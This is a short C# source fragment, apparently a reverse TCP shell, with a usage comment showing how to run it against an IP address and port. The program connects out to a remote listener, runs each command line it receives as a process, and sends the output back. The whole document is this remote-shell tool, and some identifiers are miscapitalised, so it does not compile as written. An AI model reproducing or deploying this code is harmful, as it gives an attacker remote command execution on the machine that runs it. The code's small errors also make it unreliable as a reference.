//When running place arguments like so ./reverse_tcp.exe 127.0.0.1 4444

public static void Main (string[] args) {
  using (TcpClient client = new TcpClient (args [0], int.Parse (args [1])))
  {
    using (Stream stream = client.GetStream()){
      using (StreamReader rdr = new StreamReader(stream)){
        while (true) {
          string cmd = rdr.Readline();

          if (string.IsNullOrEmpty(cmd)){
            rdr.Close();
            stream.Close();
            client.Close();
            return;
          }
          if (string.IsNullOrWhiteSpace(cmd))
            continue;

          string[] split = cmd.Trim().Split(' ');
          string filename = split.First();
          string arg = string.Join(" ", split.Skip(1));

          try {
            Process prc = new Process();
            prc.StartInfo.Filename = filename;
            prc.StartInfo.Arguments = arg;
            prc.StartInfo.UseShellExecute = false;
            prc.StartInfo.RedirectStandardOutput = true;
            prc.Start();
            prc.StandardOutput.BaseStream.CopyTo(stream);
            prc.WaitForExit();
          } catch {
            string error = "Error running command " + cmd + "\n";
            byte[] errorBytes = Encoding.ASCII.GetBytes(error);
            stream.Write(errorBytes, 0, errorBytes.Length);
          }
        }
      }
    }
  }
}
